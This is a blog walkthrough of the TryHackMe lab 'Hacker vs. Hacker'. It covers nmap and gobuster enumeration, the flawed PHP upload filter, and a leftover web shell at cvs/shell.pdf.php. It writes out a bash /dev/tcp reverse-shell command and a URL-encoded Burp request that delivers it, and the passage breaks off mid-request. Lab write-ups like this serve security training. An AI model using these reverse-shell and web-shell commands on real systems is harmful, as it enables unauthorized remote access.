id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Hacker vs. Hacker</h1><div class=post-meta></div></header><div class=post-content><p>📆 22/08/2022 - geobour98<br>⌚ 8 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/hackervshacker target=_blank style=color:#e30f0f>Hacker vs. Hacker</a></p><p>Someone has compromised this server already! Can you get in and evade their countermeasures?</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.156.143</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-22 21:48 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 21:48
</span></span><span style=display:flex><span>Scanning 10.10.156.143 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 21:48, 0.10s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:48
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:48, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 21:48
</span></span><span style=display:flex><span>Scanning 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.156.143
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.156.143
</span></span><span style=display:flex><span>Connect Scan Timing: About 39.43% <span style=color:#66d9ef>done</span>; ETC: 21:49 <span style=color:#f92672>(</span>0:00:48 remaining<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Connect Scan at 21:49, 75.01s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.065s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 75.16 seconds
</span></span></code></pre></div><ul><li>Command: <code>sudo nmap -A -p 22,80 -v 10.10.156.143</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -p 22,80 -v 10.10.156.143
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-22 21:50 EEST
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:50
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 21:50
</span></span><span style=display:flex><span>Scanning 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.156.143
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.156.143
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 21:50, 0.10s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 21:50
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 21:50, 6.21s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.156.143 (10.10.156.143)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.156.143 (10.10.156.143)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 21:50
</span></span><span style=display:flex><span>Completed Traceroute at 21:50, 0.08s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:50
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.156.143.
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 2.99s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.27s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.066s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: RecruitSec: Industry Leading Infosec Recruitment
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: POST OPTIONS HEAD GET
</span></span><span style=display:flex><span>|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.1 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.11 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.2 - 4.9 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.7 - 3.10 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Uptime guess: 33.377 days <span style=color:#f92672>(</span>since Wed Jul <span style=color:#ae81ff>20</span> 12:48:00 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>256</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 22/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   67.28 ms 10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   66.56 ms 10.10.156.143 <span style=color:#f92672>(</span>10.10.156.143<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:50
</span></span><span style=display:flex><span>Completed NSE at 21:50, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.64 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>56</span> <span style=color:#f92672>(</span>4.084KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>40</span> <span style=color:#f92672>(</span>3.056KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><ul><li>Command: <code>gobuster dir -u http://10.10.156.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://10.10.151.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.156.143/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php,txt,html
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/08/22 21:53:10 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/.htpasswd            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd.txt        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess.txt        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta.txt             <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd.html       <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess.html       <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta.html            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta.php             <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 312<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.156.143/css/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/cvs                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 312<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.156.143/cvs/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/dist                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 313<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.156.143/dist/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/images               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 315<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.156.143/images/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 3413<span style=color:#f92672>]</span>                                  
</span></span><span style=display:flex><span>/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 3413<span style=color:#f92672>]</span>                                  
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>                                   
</span></span><span style=display:flex><span>/upload.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 552<span style=color:#f92672>]</span>                                   
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/08/22 21:54:06 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>After navigating to port 80 in a web browser, we see an interesting file upload functionality, but nothing happens when we try to upload a file. Then, we navigate to /upload.php and view it&rsquo;s source code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>Hacked</span><span style=color:#f92672>!</span> <span style=color:#66d9ef>If</span> <span style=color:#a6e22e>you</span> <span style=color:#a6e22e>dont</span> <span style=color:#a6e22e>want</span> <span style=color:#a6e22e>me</span> <span style=color:#a6e22e>to</span> <span style=color:#a6e22e>upload</span> <span style=color:#a6e22e>my</span> <span style=color:#a6e22e>shell</span>, <span style=color:#66d9ef>do</span> <span style=color:#a6e22e>better</span> <span style=color:#a6e22e>at</span> <span style=color:#a6e22e>filtering</span><span style=color:#f92672>!</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!--</span> <span style=color:#a6e22e>seriously</span>, <span style=color:#a6e22e>dumb</span> <span style=color:#a6e22e>stuff</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$target_dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cvs/&#34;</span>;
</span></span><span style=display:flex><span>$target_file <span style=color:#f92672>=</span> $target_dir <span style=color:#f92672>.</span> <span style=color:#a6e22e>basename</span>($_FILES[<span style=color:#e6db74>&#34;fileToUpload&#34;</span>][<span style=color:#e6db74>&#34;name&#34;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>strpos</span>($target_file, <span style=color:#e6db74>&#34;.pdf&#34;</span>)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Only PDF CVs are accepted.&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($target_file)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;This CV has already been uploaded!&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#34;fileToUpload&#34;</span>][<span style=color:#e6db74>&#34;tmp_name&#34;</span>], $target_file)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Success! We will get back to you.&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Something went wrong :|&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>--&gt;</span>
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>A possible vulnerability on <code>strpos()</code> would be to upload a file with <code>.pdf.php</code> extension. But this doesn&rsquo;t work too. Then we search for already uploaded files with this extension in <code>cvs/</code> directory.</p><ul><li>Command: <code>gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.156.143/cvs/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              pdf.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/08/22 21:59:29 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/.htaccess            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess.pdf.php    <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd.pdf.php    <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta.pdf.php         <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 26<span style=color:#f92672>]</span> 
</span></span><span style=display:flex><span>/shell.pdf.php        <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 18<span style=color:#f92672>]</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/08/22 21:59:57 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>Just try the basic parameter <code>cmd</code> to check for code execution. The URL is: <code>http://10.10.156.143/cvs/shell.pdf.php?cmd=id</code> and we do have code execution because the output is: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>. In order to get a reverse shell, we intercept that request with Burp proxy, send it to Repeater, and execute a bash reverse shell like the following: <code>bash -c 'exec bash -i &>/dev/tcp/10.8.200.50/443 &lt;&1'</code>, but it has to be URL-encoded.<br>The request in Burp should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>GET /cvs/shell.pdf.php?cmd=bash+-c+&#39;exec+bash+-i+%26&gt;/dev/tcp/10.8.200.50/443+&lt;%261&#39; HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.186.151
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q=0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>Cache-Control: max-age=0
